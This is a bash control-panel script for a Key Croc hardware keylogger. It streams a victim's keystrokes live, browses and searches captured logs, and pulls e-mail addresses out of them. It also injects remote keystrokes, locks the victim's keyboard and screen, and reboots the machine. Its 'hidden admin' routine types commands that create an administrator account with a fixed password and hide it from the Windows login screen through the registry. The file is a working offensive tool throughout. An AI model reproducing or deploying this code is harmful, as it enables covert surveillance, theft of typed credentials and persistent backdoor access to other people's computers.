#!/bin/bash
# ----------------------------- Settings ---------------------------------------

LOOT_DIR="/root/udisk/loot"
LIVE_LOG="/root/loot/croc_char.log"
EMAIL_FILE="$LOOT_DIR/emails.log"
MATCH_FILE="$LOOT_DIR/matches.log"

SEP="=============================================="

# ----------------------------- UI helpers -------------------------------------

clear_screen() {
        printf '\033[H\033[2J'
}

wait_enter() {
        echo ""
        read -p "Press Enter to continue... " _
}

yes_no() {
        case "$1" in
                y|Y|yes|YES) return 0 ;;
                *)           return 1 ;;
        esac
}

attack() {
        ATTACKMODE "$@" >/dev/null 2>&1
}

quack() {
        QUACK "$@" >/dev/null 2>&1
}

# ----------------------------- Main menu --------------------------------------

print_menu() {
        clear_screen
        echo "$SEP"
        echo "          KEY CROC CONTROL PANEL"
        echo "$SEP"
        echo "  [1] Live keystroke"
        echo "  [2] Browse logs"
        echo "  [3] Remote keyboard"
        echo "  [4] Lock keyboard"
        echo "  [5] Extract e-mails"
        echo "  [6] Lock screen"
        echo "  [7] Create account"
        echo "  [8] Reboot PC"
        echo "  [9] Search phrase"
        echo "  [0] Exit"
        echo "$SEP"
        echo -n "Choice: "
}

# ----------------------------- [1] Live feed ----------------------------------

run_live() {
        clear_screen
        echo "Live keystroke feed ($LIVE_LOG)"
        echo "Ctrl+C to go back."
        echo ""

        trap 'trap - SIGINT; return' SIGINT
        WAIT_FOR_KEYBOARD_ACTIVITY 0 >/dev/null 2>&1
        tail -f "$LIVE_LOG"
        trap - SIGINT
}

# ----------------------------- [2] Browse logs --------------------------------

show_log() {
        find "$LOOT_DIR" -name "$1" -exec echo "--- {} ---" \; -exec cat {} \; | less
}

run_logs() {
        while true; do
                clear_screen
                echo "$SEP"
                echo "           LOG BROWSER"
                echo "$SEP"
                echo "  Chars in croc_char.log: $(find "$LOOT_DIR" -name 'croc_char.log' -exec cat {} + 2>/dev/null | wc -m)"
                echo "$SEP"
                echo "  [1] croc_char.log"
                echo "  [2] croc_raw.log"
                echo "  [3] QUACK.log"
                echo "  [4] hotplug.log"
                echo "  [5] attackmode.log"
                echo "  [0] Back"
                echo "$SEP"
                echo -n "Choice: "
                read pick

                case "$pick" in
                        1) show_log "croc_char.log" ;;
                        2) show_log "croc_raw.log" ;;
                        3) show_log "QUACK.log" ;;
                        4) show_log "hotplug.log" ;;
                        5) show_log "attackmode.log" ;;
                        0) return ;;
                        *) echo "Bad choice."; sleep 1 ;;
                esac
        done
}

# ----------------------------- [3] Remote keyboard ----------------------------

print_remote_help() {
        echo "Remote keyboard - shortcuts (prefix: comma)"
        echo ""
        echo "  ,q        exit back to menu"
        echo "  ,r        Win+R"
        echo "  ,d        show desktop"
        echo "  ,9        open terminal (Ctrl+Alt+T)"
        echo "  ,4        close window (Alt+F4)"
        echo "  ,t        Alt+Tab"
        echo "  ,u        unlock victim's keyboard"
        echo "  ,o        lock victim's keyboard"
        echo "  ,x        Win+X"
        echo "  ,w        Win key"
        echo "  ,z        Ctrl+Z"
        echo ""
        echo "  All other keys are passed through as-is."
        echo "  To type a literal comma, press comma twice (,,)."
        echo ""
}

run_remote() {
        clear_screen
        print_remote_help
        read -p "Start remote keyboard (run from SSH)? [y/N] " go
        yes_no "$go" || return

        quack LOCK
        sleep 1
        stty -echo
        trap - SIGINT

        declare -a fkey
        for n in {1..12}; do
                fkey["$n"]="$(tput kf"$n" 2>/dev/null | cat -A)"
                fkey["$n"]="${fkey[$n]#^[}"
        done

        read_key() {
                if IFS= read -r -n 1 key; then
                        while read -N 1 -t 0.001; do key+="$REPLY"; done
                        printf -v code "%d" "'$key"
                fi
        }

        read_combo() {
                IFS= read -r -n 1 -t 1 combo
        }

        echo ""
        echo "Active. Type ,q to exit."
        echo ""

        while read_key; do
                case "$key" in
                        ,)
                                if read_combo; then
                                        case "$combo" in
                                                q) quack UNLOCK; stty echo; echo; return ;;
                                                r) quack GUI r         ; echo -n " WIN+R "    ;;
                                                d) quack GUI d         ; echo -n " DESKTOP "  ;;
                                                9) quack CONTROL-ALT-t ; echo -n " TERMINAL " ;;
                                                4) quack ALT-F4        ; echo -n " CLOSE "    ;;
                                                t) quack ALT-TAB       ; echo -n " ALT+TAB "  ;;
                                                u) quack UNLOCK        ; echo -n " UNLOCK "   ;;
                                                o) quack LOCK          ; echo -n " LOCK "     ;;
                                                x) quack GUI x         ; echo -n " WIN+X "    ;;
                                                w) quack GUI           ; echo -n " WIN "      ;;
                                                z) quack CONTROL-z     ; echo -n " CTRL+Z "   ;;
                                                ,) quack STRING ","    ; echo -n "," ;;
                                                *) echo -n " [?,${combo}] " ;;
                                        esac
                                fi
                                ;;

                        $'\e'"${fkey[1]}")  quack F1  ; echo -n " F1 "  ;;
                        $'\e'"${fkey[2]}")  quack F2  ; echo -n " F2 "  ;;
                        $'\e'"${fkey[3]}")  quack F3  ; echo -n " F3 "  ;;
                        $'\e'"${fkey[4]}")  quack F4  ; echo -n " F4 "  ;;
                        $'\e'"${fkey[5]}")  quack F5  ; echo -n " F5 "  ;;
                        $'\e'"${fkey[6]}")  quack F6  ; echo -n " F6 "  ;;
                        $'\e'"${fkey[7]}")  quack F7  ; echo -n " F7 "  ;;
                        $'\e'"${fkey[8]}")  quack F8  ; echo -n " F8 "  ;;
                        $'\e'"${fkey[9]}")  quack F9  ; echo -n " F9 "  ;;
                        $'\e'"${fkey[10]}") quack F10 ; echo -n " F10 " ;;
                        $'\e'"${fkey[11]}") quack F11 ; echo -n " F11 " ;;
                        $'\e'"${fkey[12]}") quack F12 ; echo -n " F12 " ;;

                        $'\E[A')  quack UPARROW    ; echo -n " UP "    ;;
                        $'\E[B')  quack DOWNARROW  ; echo -n " DOWN "  ;;
                        $'\E[C')  quack RIGHTARROW ; echo -n " RIGHT " ;;
                        $'\E[D')  quack LEFTARROW  ; echo -n " LEFT "  ;;
                        $'\e[H')  quack HOME       ; echo -n " HOME "  ;;
                        $'\e[F')  quack END        ; echo -n " END "   ;;
                        $'\e[2~') quack INSERT     ; echo -n " INS "   ;;
                        $'\e[3~') quack DELETE     ; echo -n " DEL "   ;;
                        $'\e[5~') quack KEYCODE 00,00,4b ; echo -n " PGUP " ;;
                        $'\e[6~') quack PAGEDOWN   ; echo -n " PGDN "  ;;

                        $'\t')    quack TAB            ; echo -n " TAB " ;;
                        $'\033')  quack ESCAPE         ; echo -n " ESC " ;;
                        $'\177')  quack BACKSPACE      ; echo -ne "\b \b" ;;
                        $'\x20')  quack KEYCODE 00,00,2c ; echo -n " " ;;
                        $'\0')    quack ENTER          ; echo "" ;;

                        [[:graph:]]) quack STRING "$key" ; echo -n "$key" ;;

                        *)
                                case "$code" in
                                        1)  quack CONTROL-a ; echo -n " CTRL+A " ;;
                                        3)  quack CONTROL-c ; echo -n " CTRL+C " ;;
                                        4)  quack CONTROL-d ; echo -n " CTRL+D " ;;
                                        22) quack CONTROL-v ; echo -n " CTRL+V " ;;
                                        24) quack CONTROL-x ; echo -n " CTRL+X " ;;
                                        26) quack CONTROL-z ; echo -n " CTRL+Z " ;;
                                esac
                                ;;
                esac
        done

        quack UNLOCK
        stty echo
}

# ----------------------------- [4] Lock keyboard ------------------------------

run_lock_keyboard() {
        clear_screen
        echo "Lock victim's keyboard"
        echo ""
        read -p "Duration in seconds [60]: " secs

        secs=${secs:-60}
        if ! [[ "$secs" =~ ^[0-9]+$ ]]; then
                secs=60
        fi

        quack LOCK
        sleep 1

        while [ "$secs" -gt 0 ]; do
                echo -ne "Time left: $secs s\033[0K\r"
                sleep 1
                secs=$((secs - 1))
        done

        quack UNLOCK
        echo ""
        echo "Unlocked."
        wait_enter
}

# ----------------------------- [5] E-mail extractor ---------------------------

run_emails() {
        clear_screen
        echo "Scanning logs for e-mail addresses..."
        echo "$SEP"
        echo ""
		
        found=$(find "$LOOT_DIR" /root/loot -name "croc_char.log" \
                -exec cat {} + 2>/dev/null \
                | sed 's/\[ENTER\]/\
/g' \
                | sed 's/\[[^]]*\]//g' \
                | grep -o '[a-zA-Z0-9._%-]*@[a-zA-Z0-9._%-]*\.[a-zA-Z]*' \
                | sort -u)

        if [ -z "$found" ]; then
                echo "None found."
        else
                n=$(echo "$found" | wc -l)
                echo "Found $n unique:"
                echo ""
                echo "$found"

                {
                        echo ""
                        echo "=== Scan $(date) ==="
                        echo "$found"
                } >> "$EMAIL_FILE"

                echo ""
                echo "Saved: $EMAIL_FILE"
        fi

        wait_enter
}

# ----------------------------- [6] Lock screen --------------------------------

run_lock_screen() {
        clear_screen
        echo "Locking victim's screen..."
        attack HID
        sleep 2
        quack GUI l
        wait_enter
}

# ----------------------------- [7] Hidden admin account -----------------------

run_hidden_admin() {
        clear_screen
        echo "Create admin account"
        echo ""
        echo "  User:  support"
        echo "  Pass:  P@ss123"
        echo "  Group: Administratorzy"
        echo ""
        read -p "Continue? [y/N] " go
        yes_no "$go" || return

        attack HID
        sleep 2

        quack GUI r
        sleep 1.5

        quack STRING "powershell -Command \"Start-Process powershell -Verb RunAs\""
        quack ENTER
        sleep 5

        quack LEFTARROW
        sleep 1
        quack ENTER
        sleep 3

        quack STRING "net user support P@ss123 /add"
        quack ENTER
        sleep 2

        quack STRING "net localgroup Administratorzy support /add"
        quack ENTER
        sleep 2

        quack STRING "reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\UserList\" /v support /t REG_DWORD /d "
        sleep 1
        quack KEYCODE 00,00,2c
        sleep 1
        quack KEYCODE 00,00,27
        sleep 1
        quack STRING " /f"
        quack ENTER
        sleep 2

        quack STRING "exit"
        quack ENTER

        echo "Done."
        wait_enter
}

# ----------------------------- [8] Reboot -------------------------------------

run_reboot() {
        clear_screen
        echo "Sending reboot..."
        attack HID
        sleep 2

        quack GUI r
        sleep 1.5

        quack STRING "shutdown /r /t"
        sleep 1
        quack KEYCODE 00,00,2c
        sleep 1
        quack KEYCODE 00,00,27
        sleep 1
        quack ENTER

        wait_enter
}

# ----------------------------- [9] Search in logs -----------------------------

run_search() {
        clear_screen
        echo "Search inside logs"
        echo ""
        read -p "Phrase: " phrase

        if [ -z "$phrase" ]; then
                echo "Empty phrase."
                wait_enter
                return
        fi

        echo ""
        echo "Results for: $phrase"
        echo "$SEP"

        hits=$(find "$LOOT_DIR" /root/loot -name "croc_char.log" \
                -exec grep -n -- "$phrase" {} + 2>/dev/null)

        if [ -z "$hits" ]; then
                echo "Nothing found."
        else
                echo "$hits" | grep --color=always -- "$phrase"
                echo ""
                read -p "Save to matches.log? [y/N] " save
                if yes_no "$save"; then
                        {
                                echo "=== Search: $phrase @ $(date) ==="
                                echo "$hits"
                        } >> "$MATCH_FILE"
                        echo "Saved: $MATCH_FILE"
                fi
        fi

        wait_enter
}

# ----------------------------- Main loop --------------------------------------

main() {
        while true; do
                print_menu
                read choice
                case "$choice" in
                        1) run_live           ;;
                        2) run_logs           ;;
                        3) run_remote         ;;
                        4) run_lock_keyboard  ;;
                        5) run_emails         ;;
                        6) run_lock_screen    ;;
                        7) run_hidden_admin   ;;
                        8) run_reboot         ;;
                        9) run_search         ;;
                        0) echo "Bye."; exit 0 ;;

                        [Ss]) attack HID STORAGE; sleep 3 ;;
                        [Hh]) attack HID;         sleep 3 ;;

                        *) echo "Bad choice."; sleep 1 ;;
                esac
        done
}

main
